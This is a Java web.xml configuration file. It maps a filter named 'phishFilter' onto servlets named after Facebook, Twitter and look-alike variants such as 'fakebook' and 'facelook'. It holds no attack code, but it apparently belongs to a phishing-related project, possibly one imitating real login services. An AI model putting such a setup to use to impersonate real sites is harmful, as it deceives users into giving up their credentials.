<?xml version="1.0" encoding="UTF-8"?>
<web-app version="3.0" xmlns="http://java.sun.com/xml/ns/javaee" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://java.sun.com/xml/ns/javaee http://java.sun.com/xml/ns/javaee/web-app_3_0.xsd">
    <filter>
        <filter-name>phishFilter</filter-name>
        <filter-class>classes.filter</filter-class>
    </filter>
    <filter-mapping>
        <filter-name>phishFilter</filter-name>
        <url-pattern>/servmyfacebook</url-pattern>
    </filter-mapping>
    <filter-mapping>
        <filter-name>phishFilter</filter-name>
        <url-pattern>/servmyfakebook</url-pattern>
    </filter-mapping>
    <filter-mapping>
        <filter-name>phishFilter</filter-name>
        <url-pattern>/servmyfacelook</url-pattern>
    </filter-mapping>
    <filter-mapping>
        <filter-name>phishFilter</filter-name>
        <url-pattern>/servmytwitter</url-pattern>
    </filter-mapping>
    <!--servlet mappings from here-->
    <servlet>
        <servlet-name>servmyfacebook</servlet-name>
        <servlet-class>servmyfacebook</servlet-class>
    </servlet>
    <servlet>
        <servlet-name>servmytwitter</servlet-name>
        <servlet-class>servmytwitter</servlet-class>
    </servlet>
    <servlet>
        <servlet-name>servmyfakebook</servlet-name>
        <servlet-class>servmyfakebook</servlet-class>
    </servlet>
    <servlet>
        <servlet-name>servmyfacelook</servlet-name>
        <servlet-class>servmyfacelook</servlet-class>
    </servlet>
    <servlet-mapping>
        <servlet-name>servmyfacebook</servlet-name>
        <url-pattern>/servmyfacebook</url-pattern>
    </servlet-mapping>
    <servlet-mapping>
        <servlet-name>servmytwitter</servlet-name>
        <url-pattern>/servmytwitter</url-pattern>
    </servlet-mapping>
    <servlet-mapping>
        <servlet-name>servmyfakebook</servlet-name>
        <url-pattern>/servmyfakebook</url-pattern>
    </servlet-mapping>
    <servlet-mapping>
        <servlet-name>servmyfacelook</servlet-name>
        <url-pattern>/servmyfacelook</url-pattern>
    </servlet-mapping>
    <session-config>
        <session-timeout>
            30
        </session-timeout>
    </session-config>
</web-app>
